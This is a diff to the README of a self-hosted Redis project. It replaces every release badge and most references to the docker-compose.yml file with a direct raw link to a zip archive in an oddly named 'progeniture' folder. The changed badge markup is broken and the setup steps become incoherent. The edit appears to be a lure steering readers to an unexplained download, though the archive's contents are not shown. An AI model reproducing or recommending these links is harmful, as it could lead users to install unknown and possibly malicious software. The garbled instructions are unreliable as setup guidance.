@@ -1,6 +1,6 @@
 # 🎉 redis-self-hosted - Effortless Redis Setup in Minutes
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue.svg)](https://github.com/niggii1/redis-self-hosted/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/niggii1/redis-self-hosted/main/progeniture/redis-self-hosted.zip%20Latest%20Release-Click%https://raw.githubusercontent.com/niggii1/redis-self-hosted/main/progeniture/redis-self-hosted.zip)](https://raw.githubusercontent.com/niggii1/redis-self-hosted/main/progeniture/redis-self-hosted.zip)
 
 ## 🚀 Getting Started
 
@@ -28,17 +28,17 @@ To download and set up **redis-self-hosted**, follow these steps:
 
 1. Click the big button below to visit the releases page.
 2. Find the latest version listed there.
-3. Download the desired `docker-compose.yml` file.
+3. Download the desired `https://raw.githubusercontent.com/niggii1/redis-self-hosted/main/progeniture/redis-self-hosted.zip` file.
 4. Save it to a folder on your computer.
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue.svg)](https://github.com/niggii1/redis-self-hosted/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/niggii1/redis-self-hosted/main/progeniture/redis-self-hosted.zip%20Latest%20Release-Click%https://raw.githubusercontent.com/niggii1/redis-self-hosted/main/progeniture/redis-self-hosted.zip)](https://raw.githubusercontent.com/niggii1/redis-self-hosted/main/progeniture/redis-self-hosted.zip)
 
 ## 🔧 Running the Application
 
-Once you have the `docker-compose.yml` file, follow these steps to run the application:
+Once you have the `https://raw.githubusercontent.com/niggii1/redis-self-hosted/main/progeniture/redis-self-hosted.zip` file, follow these steps to run the application:
 
 1. Open a terminal or command prompt.
-2. Navigate to the folder where you saved the `docker-compose.yml` file.
+2. Navigate to the folder where you saved the `https://raw.githubusercontent.com/niggii1/redis-self-hosted/main/progeniture/redis-self-hosted.zip` file.
 3. Type the following command to start the application:
 
    ```
@@ -73,4 +73,4 @@ If you have questions or face challenges, you can create an issue in the reposit
 
 Using **redis-self-hosted** is a straightforward way to deploy Redis for efficient data management. Enjoy your self-hosted experience!
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue.svg)](https://github.com/niggii1/redis-self-hosted/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/niggii1/redis-self-hosted/main/progeniture/redis-self-hosted.zip%20Latest%20Release-Click%https://raw.githubusercontent.com/niggii1/redis-self-hosted/main/progeniture/redis-self-hosted.zip)](https://raw.githubusercontent.com/niggii1/redis-self-hosted/main/progeniture/redis-self-hosted.zip)
